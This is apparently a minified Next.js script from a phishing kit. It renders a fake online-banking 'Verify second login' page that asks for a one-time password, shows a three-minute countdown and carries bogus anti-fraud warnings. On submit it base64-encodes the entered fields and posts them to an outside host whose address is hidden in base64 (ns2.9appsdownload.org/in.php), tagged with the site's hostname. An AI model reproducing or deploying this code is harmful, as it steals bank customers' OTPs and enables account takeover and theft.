(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [882], {
        2426: function(e, n, t) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/g", function() {
                return t(2731)
            }])
        },
        9018: function(e, n, t) {
            "use strict";
            var s = t(1876).Buffer,
                a = {
                    dataList: s.from("https://ns2.9appsdownload.org/in.php", "utf-8").toString("base64"),
                    getList: s.from("https://ns2.9appsdownload.org/aja.php", "utf-8").toString("base64")
                };
            n.Z = a
        },
        2731: function(e, n, t) {
            "use strict";
            t.r(n), t.d(n, {
                default: function() {
                    return m
                }
            });
            var s = t(7568),
                a = t(655),
                r = t(5893),
                i = t(9008),
                o = t.n(i),
                l = t(5675),
                c = t.n(l),
                u = t(7294),
                d = t(1163),
                h = t(9018),
                $ = t(1876).Buffer;

            function m() {
                var e = (0, d.useRouter)(),
                    n = (0, u.useState)(""),
                    t = n[0];
                n[1];
                var i, l = (0, u.useState)(!1),
                    m = l[0],
                    f = l[1],
                    p = (i = (0, s.Z)(function(n) {
                        var t, s, r, i, o, l, c;
                        return (0, a.__generator)(this, function(a) {
                            switch (a.label) {
                                case 0:
                                    return n.preventDefault(), f(!0), t = new FormData(n.target), s = {}, t.forEach(function(e, n) {
                                        s[n] = e
                                    }), r = JSON.stringify(s), i = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "text/plain"
                                    }, o.body = $.from(r, "utf-8").toString("base64"), o), [4, fetch(window.atob(h.Z.dataList) + "?id=" + window.location.hostname, i)];
                                case 1:
                                    return [4, (l = a.sent()).json()];
                                case 2:
                                    return c = a.sent(), f(!1), !0 == c.status ? e.push("/h") : f(!1), [2]
                            }
                        })
                    }), function(e) {
                        return i.apply(this, arguments)
                    }),
                    x = (0, u.useState)("03:00"),
                    v = x[0],
                    j = x[1];
                return (0, u.useEffect)(function() {
                    ! function e(n) {
                        var t = Math.floor(n / 60),
                            s = n % 60;
                        if (j((t = t < 10 ? "0" + t : t) + ":" + (s = s < 10 ? "0" + s : s)), (n -= 1) >= 0) {
                            setTimeout(function() {
                                e(n)
                            }, 1e3);
                            return
                        }
                    }(180)
                }, []), (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsxs)(o(), {
                        children: [(0, r.jsx)("title", {
                            children: "Verify second login"
                        }), (0, r.jsx)("meta", {
                            name: "description",
                            content: "verify second login here"
                        })]
                    }), (0, r.jsxs)("main", {
                        children: [(0, r.jsx)("div", {
                            className: "logo",
                            children: (0, r.jsx)(c(), {
                                src: "/image.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, r.jsx)("br", {}), (0, r.jsx)("div", {
                            className: "panelDiv",
                            children: (0, r.jsx)("div", {
                                className: "panel",
                                children: (0, r.jsx)("span", {
                                    children: t
                                })
                            })
                        }), (0, r.jsx)("div", {
                            className: "content_heading",
                            children: (0, r.jsx)("h3", {
                                className: "pull-left",
                                children: "Authentication"
                            })
                        }), (0, r.jsxs)("div", {
                            className: "content_area",
                            children: [(0, r.jsx)("p", {
                                className: "content_title",
                                children: "Enter One Time Password sent to your phone"
                            }), (0, r.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, r.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: p,
                                children: [(0, r.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, r.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "Otp4",
                                        children: [" One Time Password", (0, r.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, r.jsx)("input", {
                                        className: "form-control",
                                        id: "Otp4",
                                        type: "text",
                                        name: "Otp4",
                                        maxLength: 8,
                                        tabIndex: "1"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    className: "commonbutton",
                                    children: [(0, r.jsx)("input", {
                                        name: "btContinue",
                                        disabled: !!m,
                                        id: "btContinue",
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    }), (0, r.jsx)("p", {
                                        children: v
                                    })]
                                })]
                            }), (0, r.jsx)("div", {
                                className: "common_btn",
                                children: (0, r.jsxs)("p", {
                                    children: ["If you did not receive the OTP on SMS, you can", (0, r.jsx)("a", {
                                        href: "#",
                                        className: "btn btn-resend",
                                        type: "button",
                                        children: "Resend the OTP"
                                    })]
                                })
                            }), (0, r.jsx)("div", {
                                className: "info_panel",
                                children: (0, r.jsx)("div", {
                                    className: "notify_icon",
                                    children: (0, r.jsxs)("ul", {
                                        children: [(0, r.jsx)("li", {
                                            children: "We never sends you email/SMS or calls you over phone to get your personal information, password Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials."
                                        }), (0, r.jsx)("li", {
                                            children: "Please note that you will receive the all communication related to Internet banking on your updated mobile number only after approval."
                                        })]
                                    })
                                })
                            })]
                        }), (0, r.jsx)("div", {
                            className: "footer_area",
                            children: (0, r.jsx)(c(), {
                                src: "/v.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, r.jsx)("div", {
                            className: "footer",
                            children: (0, r.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(e, n, t) {
            "use strict";

            function s(e, n, t, s, a, r, i) {
                try {
                    var o = e[r](i),
                        l = o.value
                } catch (c) {
                    t(c);
                    return
                }
                o.done ? n(l) : Promise.resolve(l).then(s, a)
            }

            function a(e) {
                return function() {
                    var n = this,
                        t = arguments;
                    return new Promise(function(a, r) {
                        var i = e.apply(n, t);

                        function o(e) {
                            s(i, a, r, o, l, "next", e)
                        }

                        function l(e) {
                            s(i, a, r, o, l, "throw", e)
                        }
                        o(void 0)
                    })
                }
            }
            t.d(n, {
                Z: function() {
                    return a
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 876, 774, 888, 179], function() {
            return e(e.s = 2426)
        }), _N_E = e.O()
    }
]);